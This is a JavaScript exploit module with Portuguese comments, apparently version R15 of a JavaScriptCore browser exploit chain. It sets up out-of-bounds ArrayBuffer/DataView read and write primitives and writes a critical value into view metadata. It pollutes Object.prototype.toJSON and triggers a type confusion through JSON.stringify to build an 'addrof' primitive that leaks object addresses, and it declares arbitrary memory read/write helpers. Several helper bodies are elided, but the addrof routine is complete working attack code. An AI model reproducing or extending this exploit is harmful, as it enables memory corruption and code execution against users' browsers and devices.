// js/core_exploit.mjs (v31.R15 - Sonda Addrof mais robusta)

import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs'; 
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false; 

const toHexHelper = (val, bits = 32) => toHex(val, bits);

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 
const HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET = 0x7C; 

const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; 
const OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; 
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

// Funções de gerenciamento OOB (sem alterações da v31.R14)
export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) { /* ... */ }
export function getOOBAllocationSize() { /* ... */ }
export function getBaseOffsetInDV() { /* ... */ }
export function getInitialBufferSize() { /* ... */ }
export async function triggerOOB_primitive(options = { force_reinit: false }) { /* ... (sem alterações da v31.R14) ... */ }
export function oob_read_absolute(offset_in_oob_buffer, byteLength) { /* ... (sem alterações da v31.R14) ... */ }
export function oob_write_absolute(offset_in_oob_buffer, value, byteLength) { /* ... (sem alterações da v31.R14) ... */ }
export function isOOBReady() { /* ... (sem alterações da v31.R14, com logging interno) ... */ }
async function _perform_explicit_dv_reset_after_arb_op(fname_parent_for_log) { /* ... (sem alterações) ... */ }
export async function arb_read(absolute_address, byteLength) { /* ... (sem alterações) ... */ }
export async function arb_write(absolute_address, value, byteLength) { /* ... (sem alterações) ... */ }
export async function selfTestOOBReadWrite(logFnParam) { /* ... (sem alterações) ... */ }

const HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC = HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET; 
const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
const HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE = 8;    

export async function selfTestTypeConfusionAndMemoryControl(logFnParam) { /* ... (sem alterações) ... */ }

// Variáveis para attemptAddrofUsingCoreHeisenbug e sua sonda
let _targetObjectForCoreAddrof_R15 = null; 
let _core_heisenbug_tc_on_expected_object_confirmed_R15 = false; // Renomeado para clareza
let _core_victim_float_view_for_addrof_R15 = null; 
let _core_m1_victim_being_stringified_R15 = null; // Referência ao M1 para ajudar a sonda

function _toJSONProbeForCoreAddrof_R15() { 
    const FNAME_PROBE = "CoreExploit._toJSONProbeForCoreAddrof_R15";
    let currentThisType = Object.prototype.toString.call(this);
    
    // A sonda é chamada para cada objeto no caminho de stringify.
    // Queremos identificar quando 'this' é o core_m2_victim (payload do core_m1_victim)
    // E seu tipo é [object Object]
    // E ainda não processamos a TC para esta execução de attemptAddrof...

    // Verifica se 'this' é o payload do M1 que está sendo stringificado
    let isPotentiallyOurM2Target = false;
    if (_core_m1_victim_being_stringified_R15 && this === _core_m1_victim_being_stringified_R15.payload_m2) {
        isPotentiallyOurM2Target = true;
    }

    log(`[${FNAME_PROBE}] 'this' type: ${currentThisType}. Potentially M2 Target? ${isPotentiallyOurM2Target}. TC Already Confirmed this run? ${_core_heisenbug_tc_on_expected_object_confirmed_R15}`, "leak");

    if (isPotentiallyOurM2Target && currentThisType === '[object Object]' && !_core_heisenbug_tc_on_expected_object_confirmed_R15) { 
        log(`[${FNAME_PROBE}] TC CONFIRMADA para payload_m2! Escrevendo targetObject...`, "vuln");
        _core_heisenbug_tc_on_expected_object_confirmed_R15 = true; // Seta o flag para esta execução de attemptAddrof
        
        if (_targetObjectForCoreAddrof_R15 && _core_victim_float_view_for_addrof_R15) {
            try {
                // 'this' aqui é o core_m2_victim confuso.
                // A escrita ocorre no _core_victim_float_view_for_addrof_R15, que foi criado separadamente.
                // A lógica original esperava que 'this' (o AB confuso) fosse onde a escrita ocorria.
                // Agora, precisamos que o M2 confuso *cause* a escrita no _core_victim_float_view_for_addrof_R15.
                // Vamos manter a escrita original: 'this' (M2 confuso) deve ter uma propriedade que é o float_view.
                if (this.writer_view_ref_probe === _core_victim_float_view_for_addrof_R15) { // Verifica se a view está correta
                    this.writer_view_ref_probe[0] = _targetObjectForCoreAddrof_R15;
                    log(`[${FNAME_PROBE}] targetObject escrito em this.writer_view_ref_probe[0].`, "info");
                } else {
                     log(`[${FNAME_PROBE}] ERRO: this.writer_view_ref_probe não é o esperado _core_victim_float_view_for_addrof_R15.`, "error");
                     _core_heisenbug_tc_on_expected_object_confirmed_R15 = false; // Invalida a confirmação se a escrita falhar
                }
            } catch (e_write) { 
                log(`[${FNAME_PROBE}] ERRO ao escrever targetObject: ${e_write.message}`, "error");
                _core_heisenbug_tc_on_expected_object_confirmed_R15 = false; // Invalida
            }
        } else { 
            log(`[${FNAME_PROBE}] AVISO: targetObject ou float_view não definidos na sonda.`, "warn");
            _core_heisenbug_tc_on_expected_object_confirmed_R15 = false; // Invalida
        }
    } else if (isPotentiallyOurM2Target && currentThisType !== '[object Object]' && !_core_heisenbug_tc_on_expected_object_confirmed_R15) {
        log(`[${FNAME_PROBE}] 'this' é payload_m2, mas tipo é ${currentThisType}. TC ainda não ocorreu/confirmada para este objeto.`, "warn");
    }
    return { core_addrof_probe_r15_executed: true }; // Retorno simples
}

export async function attemptAddrofUsingCoreHeisenbug(targetObject) { // MODIFICADO PARA R15
    const FNAME_FUNC = "CoreExploit.attemptAddrofUsingCoreHeisenbug_R15";
    log(`[${FNAME_FUNC}] Iniciando tentativa de addrof R15...`, "info");

    _targetObjectForCoreAddrof_R15 = targetObject; 
    _core_heisenbug_tc_on_expected_object_confirmed_R15 = false; // Reset para esta chamada
    _core_victim_float_view_for_addrof_R15 = null;
    _core_m1_victim_being_stringified_R15 = null;

    let addrof_result = { success: false, message: "Addrof (Heisenbug R15) não iniciado.", leaked_address_as_int64: null, leaked_address_as_double: null };
    let originalToJSON_R15 = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let pollutedByCore_R15 = false;

    try {
        await triggerOOB_primitive({ force_reinit: true }); 
        if (!isOOBReady()) { throw new Error("Ambiente OOB não pôde ser inicializado para Addrof R15."); }
        log(`[${FNAME_FUNC}] Ambiente OOB pronto. Escrevendo valor crítico...`, "info");

        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        log(`[${FNAME_FUNC}] Escrita crítica em ${toHexHelper(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC)} realizada.`, "warn");
        await PAUSE(150); 

        let core_victim_buffer_local = new ArrayBuffer(HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE); 
        _core_victim_float_view_for_addrof_R15 = new Float64Array(core_victim_buffer_local); // Armazena na var de módulo
        _core_victim_float_view_for_addrof_R15.fill(0.1122334455); 
        
        let core_m2_victim_local_obj = { 
            id_m2_probe_field: "core_m2_target_R15", 
            writer_view_ref_probe: _core_victim_float_view_for_addrof_R15 // Sonda usará esta referência
        };
        
        _core_m1_victim_being_stringified_R15 = { // Armazena M1 na var de módulo para a sonda
            id_m1: "core_m1_container_R15", 
            payload_m2: core_m2_victim_local_obj 
        };
        log(`[${FNAME_FUNC}] Estrutura core_m1/m2_victim criada. Alvo stringify: _core_m1_victim_being_stringified_R15.`, "info");
        
        Object.defineProperty(Object.prototype, 'toJSON', { value: _toJSONProbeForCoreAddrof_R15, writable: true, configurable: true, enumerable: false });
        pollutedByCore_R15 = true;
        
        JSON.stringify(_core_m1_victim_being_stringified_R15); 
        log(`[${FNAME_FUNC}] JSON.stringify concluído. _core_heisenbug_tc_on_expected_object_confirmed_R15: ${_core_heisenbug_tc_on_expected_object_confirmed_R15}`, "info");
        
        if (_core_heisenbug_tc_on_expected_object_confirmed_R15) { // Verifica o flag que a sonda deveria ter setado
            const val_double = _core_victim_float_view_for_addrof_R15[0]; 
            addrof_result.leaked_address_as_double = val_double;
            const temp_buf = new ArrayBuffer(8); new Float64Array(temp_buf)[0] = val_double;
            const temp_u32_view = new Uint32Array(temp_buf);
            const leaked_addr64 = new AdvancedInt64(temp_u32_view[0], temp_u32_view[1]);
            addrof_result.leaked_address_as_int64 = leaked_addr64;
            log(`[${FNAME_FUNC}] Heisenbug TC INTERNA confirmada e escrita realizada! Lido de float_view[0]: Double=${val_double}, Int64=${leaked_addr64.toString(true)}`, "vuln");

            if (val_double !== 0.1122334455 && (leaked_addr64.low() !== 0 || leaked_addr64.high() !==0) ) {
                const lhi = leaked_addr64.high(); const nan_inf = (lhi >= 0x7FF00000 && lhi < 0x80000000) || (lhi >= 0xFFF00000 && lhi < 0x100000000);
                if (!nan_inf) { addrof_result.success = true; addrof_result.message = `Addrof R15 TC OK. Addr Pot: ${leaked_addr64.toString(true)}`; }
                else { addrof_result.message = `Addrof R15 TC OK, mas val ${leaked_addr64.toString(true)} é NaN/Inf.`;}
            } else { addrof_result.message = `Addrof R15 TC OK, mas val (${leaked_addr64.toString(true)}) é preenchimento/0.`;}
        } else { addrof_result.message = "Heisenbug TC INTERNA NÃO confirmada pela sonda R15 para o objeto esperado."; }
    } catch (e) { addrof_result.message = `Erro crítico em Addrof R15: ${e.message || String(e)}`; } 
    finally {
        if (pollutedByCore_R15) { if (originalToJSON_R15) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON_R15); else delete Object.prototype.toJSON; }
        _targetObjectForCoreAddrof_R15 = null; _core_victim_float_view_for_addrof_R15 = null; _core_m1_victim_being_stringified_R15 = null;
    }
    log(`[${FNAME_FUNC}] Retornando resultado: ${JSON.stringify(addrof_result)}`, addrof_result.success ? "good" : "warn");
    return addrof_result;
}

// getStableConfusedArrayBuffer e get_powerful_dataview_on_oob_buffer (sem alterações da v31.R13)
export async function getStableConfusedArrayBuffer() { /* ... */ }
export async function get_powerful_dataview_on_oob_buffer() { /* ... */ }
export function read_memory_with_dataview(dv, dv_base_address, target_address, num_bytes, littleEndian = true) { /* ... */ }
export function write_memory_with_dataview(dv, dv_base_address, target_address, value, num_bytes, littleEndian = true) { /* ... */ }
